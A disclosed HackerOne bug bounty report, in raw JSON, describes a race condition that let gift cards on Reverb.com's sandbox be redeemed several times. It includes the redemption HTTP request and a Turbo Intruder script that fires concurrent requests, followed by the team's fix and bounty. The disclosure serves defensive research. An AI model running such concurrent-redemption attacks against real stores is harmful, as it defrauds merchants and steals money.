{"id":759247,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83NTkyNDc=","url":"https://hackerone.com/reports/759247","title":"Race Condition allows to redeem multiple times gift cards which leads to free \"money\"","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2019-12-16T09:54:54.977Z","submitted_at":"2019-12-16T09:54:54.977Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"muon4","url":"/muon4","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/059/198/429603a5d61e7bc28452e32313e498cdfa655d87_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":3094,"url":"https://hackerone.com/reverb","handle":"reverb","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/003/094/b7238acaca15ddb329cf25e69c687352247aece5_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/094/b7238acaca15ddb329cf25e69c687352247aece5_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"disabled","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Reverb.com","twitter_handle":"reverb","website":"https://sandbox.reverb.com","about":"The best place for musicians to buy and sell the gear they use to create the music they love."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2020-01-25T17:58:21.425Z","bug_reporter_agreed_on_going_public_at":"2019-12-26T17:58:17.829Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hello team!\n\nI've found a Race Condition vulnerability which allows to redeem gift cards multiple times. This how a s/he can easily buy stuff just bying one gift card and redeem it over and over again.\n\n\n## Steps to reproduce\n\n### Preparations\n- Burp Suite Pro\n- Turbo Intruder\n\nNote: This also can be reproduced other way but this is maybe the easiest\n\n### The attack\n\n- Login\n- Buy a gift card\n- Now redeem it at `https://sandbox.reverb.com/\u003clang\u003e/redeem`\n- Intercept the request which will be following:\n\n```\nPOST /fi/redeem HTTP/1.1\nHost: sandbox.reverb.com\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://sandbox.reverb.com/fi/redeem\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 176\nConnection: keep-alive\nCookie: \u003ccookies\u003e\n\nutf8=%E2%9C%93\u0026authenticity_token=\u003cCSRF token\u003e\u0026token=\u003cGIFT card\u003e\u0026commit=Redeem+Now\n```\n\n- Send it to the turbo intruder\n- Use this python code as a payload of the turbo intruder\n\n```\ndef queueRequests(target, wordlists):\n    engine = RequestEngine(endpoint=target.endpoint,\n                           concurrentConnections=30,\n                           requestsPerConnection=30,\n                           pipeline=False\n                           )\n\n   for i in range(30):\n\tengine.queue(target.req, i)\n        engine.queue(target.req, target.baseInput, gate='race1')\n\n\n    engine.start(timeout=5)\n   engine.openGate('race1')\n\n    engine.complete(timeout=60)\n\n\ndef handleResponse(req, interesting):\n\ttable.add(req)\n```\n\n- Now set the external HTTP header `x-request: %s` - This is needed by the turbo intruder\n- Click \"Attack\" \n- See multiple 200 OK responses:\n\n{F660741}\n\n- Check your Reverb bucks and see that you have a way more money than the gift card actually was worth of:\n\n{F660740}\n\nIn my case I bought one gift card which was worth of 25$ and as we can see from the picture I was able to redeem it 7 times which makes 25*7 = 175$.\n\nIf you need any information please let me know.\n\nCheers!\n\n## Impact\n\nRace Condition can be used for get almost free stuff and steal money.","bounty_amount":"1500.0","formatted_bounty":"$1,500","weakness":{"id":65,"name":"Business Logic Errors"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":660740,"file_name":"reverb.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/srnH4jsmfXQyVhLAHW1ZJ3Ta?response-content-disposition=attachment%3B%20filename%3D%22reverb.png%22%3B%20filename%2A%3DUTF-8%27%27reverb.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQYC7ZV3WT%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T152404Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCIDrMLp4%2BWn0RnMngqqBOAomCU8GWEnyzbfeWXMTkRqdkAiEAmbCt%2FtYvzimCcqsBY5T%2BAP6C1koJvsZIEr7pm24tsEAqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDHO5iuzPFsJ4aK7KmSrXA43fG9ZExUYtmldfJFAHkWRlov9q%2FHMMPiqI7JWoul8iB2lnCe0Z8UD9oM5cfjZfhntNLx94myZGJfeT24YbqZ%2BCsOqn%2BPXRlK7VWqoq1AV8zdBtboSY1qGlF1yW0h8xQvR1G807ShHTgDzCxdIUl0y2PUXdt%2BRNIlHckLFzjBfbJBmGFikh%2B68wwr3qhH%2BRekBJT8dRJqkMmVmJIoL4rn3y%2FCM010RJxL86Xuoat%2BrN046smSjkfceh4bPaJkOADf33dP%2FBliSDcBjoMG74ZFHPAmgnqoN439xdfqhUpIPqNFrcRU1WpQhc12VYut5tMZcbmJchXopaXhvm%2B4orW3DihHvyn7HD%2BiT1cpN9baXaycQzr%2B68J9MyG01Zce8VNQxPm5eRp7v9dtdfEQ9sF3yuOsWzUwY%2BTHCD7SIcVsQFrS5Z2L5Ux3CncTXxkqQVlNCyHTcJODpncVKfD7b6uHxsAmVawhDDZJgLpATJPpVIaGa0em09aEDUcT%2FuazJtx1N1gOr8ZYZSsD6LmJlT7xfEsyzeZ%2BC%2FQQSJKyYRebEtRjLR%2BsYz4MKD2jlXjj62sVdjHko29e6c4eso%2Fx8%2Bjrkj%2BYuyD88VzMWxszti4qHccB7%2Fr3%2BsDzDViZGLBjqlAc5vcHGjagoOTjMDz6VCxHAyKKMhBY%2F4ksl1iKt3Mkg6KIb8dD7WB3B5bRwalHdLpA6q%2F0HyHwVC3k8nRLkVacoHC%2BTnF8IsDYgQMa3VWvq9UB5BqCGPwIE9Smv%2FlQf6eGWyrcOO%2Brsi6UGSaKxoz3eFt2y8zMnz71sdDkZshTNAZoB15M%2BSMQApjyeteOn3dhbojlsBvMBhOE%2FWaBGY2zXmhSJaSA%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=c8fe9ed1d0d8fac65ccea7a9b921ad6aee7945fb326c46a1ec1a46d09e78c62e","file_size":84934,"type":"image/png"},{"id":660741,"file_name":"reverb-ti.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/zbsPW6ZG2f8wPoNwQTZSo3fB?response-content-disposition=attachment%3B%20filename%3D%22reverb-ti.png%22%3B%20filename%2A%3DUTF-8%27%27reverb-ti.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQYC7ZV3WT%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T152404Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCIDrMLp4%2BWn0RnMngqqBOAomCU8GWEnyzbfeWXMTkRqdkAiEAmbCt%2FtYvzimCcqsBY5T%2BAP6C1koJvsZIEr7pm24tsEAqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDHO5iuzPFsJ4aK7KmSrXA43fG9ZExUYtmldfJFAHkWRlov9q%2FHMMPiqI7JWoul8iB2lnCe0Z8UD9oM5cfjZfhntNLx94myZGJfeT24YbqZ%2BCsOqn%2BPXRlK7VWqoq1AV8zdBtboSY1qGlF1yW0h8xQvR1G807ShHTgDzCxdIUl0y2PUXdt%2BRNIlHckLFzjBfbJBmGFikh%2B68wwr3qhH%2BRekBJT8dRJqkMmVmJIoL4rn3y%2FCM010RJxL86Xuoat%2BrN046smSjkfceh4bPaJkOADf33dP%2FBliSDcBjoMG74ZFHPAmgnqoN439xdfqhUpIPqNFrcRU1WpQhc12VYut5tMZcbmJchXopaXhvm%2B4orW3DihHvyn7HD%2BiT1cpN9baXaycQzr%2B68J9MyG01Zce8VNQxPm5eRp7v9dtdfEQ9sF3yuOsWzUwY%2BTHCD7SIcVsQFrS5Z2L5Ux3CncTXxkqQVlNCyHTcJODpncVKfD7b6uHxsAmVawhDDZJgLpATJPpVIaGa0em09aEDUcT%2FuazJtx1N1gOr8ZYZSsD6LmJlT7xfEsyzeZ%2BC%2FQQSJKyYRebEtRjLR%2BsYz4MKD2jlXjj62sVdjHko29e6c4eso%2Fx8%2Bjrkj%2BYuyD88VzMWxszti4qHccB7%2Fr3%2BsDzDViZGLBjqlAc5vcHGjagoOTjMDz6VCxHAyKKMhBY%2F4ksl1iKt3Mkg6KIb8dD7WB3B5bRwalHdLpA6q%2F0HyHwVC3k8nRLkVacoHC%2BTnF8IsDYgQMa3VWvq9UB5BqCGPwIE9Smv%2FlQf6eGWyrcOO%2Brsi6UGSaKxoz3eFt2y8zMnz71sdDkZshTNAZoB15M%2BSMQApjyeteOn3dhbojlsBvMBhOE%2FWaBGY2zXmhSJaSA%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=d9b7fb9b0602c222596dc097cfa921ae28ed6261a14a8922c453f2e1cb423d0c","file_size":27124,"type":"image/png"}],"allow_singular_disclosure_at":"2020-01-25T17:58:17.872Z","allow_singular_disclosure_after":-53990746.19455745,"singular_disclosure_allowed":true,"vote_count":261,"voters":["kryword","superhero1","stevv","kyy","jiikoo1","msultan","a_d_a_m","securitychops","u3mur4","pleorqy","and 251 more..."],"severity":{"rating":"high","author_type":"Team"},"structured_scope":{"databaseId":6416,"asset_type":"URL","asset_identifier":"sandbox.reverb.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":6562794,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"I can confirm, and we are investigating.","automated_response":false,"created_at":"2019-12-16T21:24:07.880Z","updated_at":"2019-12-16T21:24:07.880Z","actor":{"username":"ctennis","cleared":false,"url":"/ctennis","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"reverb","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":6569798,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@ctennis \n\nGreat, thanks for the answer!\n\nCheers!","automated_response":false,"created_at":"2019-12-17T13:12:16.278Z","updated_at":"2019-12-17T13:12:16.278Z","actor":{"username":"muon4","cleared":true,"url":"/muon4","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/059/198/429603a5d61e7bc28452e32313e498cdfa655d87_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"reverb","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6587642,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@ctennis \n\nSorry for asking but this was a really interesting bug and I would like to know do you have any results from your investigating yet?\n\nCheers!","automated_response":false,"created_at":"2019-12-19T11:12:26.986Z","updated_at":"2019-12-19T11:12:26.986Z","actor":{"username":"muon4","cleared":true,"url":"/muon4","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/059/198/429603a5d61e7bc28452e32313e498cdfa655d87_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"reverb","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6590286,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2019-12-19T16:31:52.621Z","updated_at":"2019-12-19T16:31:52.621Z","additional_data":{"old_severity":"Critical","new_severity":"High","old_severity_id":589880,"new_severity_id":593075},"actor":{"username":"ctennis","cleared":false,"url":"/ctennis","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"reverb","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":6590292,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks for the report.  We have fixed this particular issue.  We have some behind the scenes logic that actually would catch these types of transactions, so we don't think it would have actually gotten very far on the real site (would have been reversed), but nonetheless it is a bug that needed to be addressed.","automated_response":false,"created_at":"2019-12-19T16:33:18.424Z","updated_at":"2019-12-19T16:33:18.424Z","actor":{"url":"/reverb","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/094/b7238acaca15ddb329cf25e69c687352247aece5_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Reverb.com"}},"bounty_amount":"1500.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"reverb","collaborator":{"username":"muon4","url":"/muon4"},"actor_is_team_member":true,"actor_is_concealed_member":true},{"id":6590293,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","automated_response":false,"created_at":"2019-12-19T16:33:30.592Z","updated_at":"2019-12-19T16:33:30.592Z","actor":{"username":"ctennis","cleared":false,"url":"/ctennis","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"muon4","url":"/muon4"},"genius_execution_id":null,"team_handle":"reverb","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":6590342,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@ctennis \n\nOk, great. Thanks for the answer and the bounty!\n\nCheers!","automated_response":false,"created_at":"2019-12-19T16:36:50.924Z","updated_at":"2019-12-19T16:36:50.924Z","actor":{"username":"muon4","cleared":true,"url":"/muon4","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/059/198/429603a5d61e7bc28452e32313e498cdfa655d87_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"reverb","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6631520,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2019-12-26T17:58:17.849Z","updated_at":"2019-12-26T17:58:17.849Z","first_to_agree":true,"actor":{"username":"muon4","cleared":true,"url":"/muon4","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/059/198/429603a5d61e7bc28452e32313e498cdfa655d87_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"reverb","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6871563,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2020-01-25T17:58:21.449Z","updated_at":"2020-01-25T17:58:21.449Z","actor":{"url":"/reverb","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/094/b7238acaca15ddb329cf25e69c687352247aece5_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Reverb.com"}},"genius_execution_id":null,"team_handle":"reverb","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}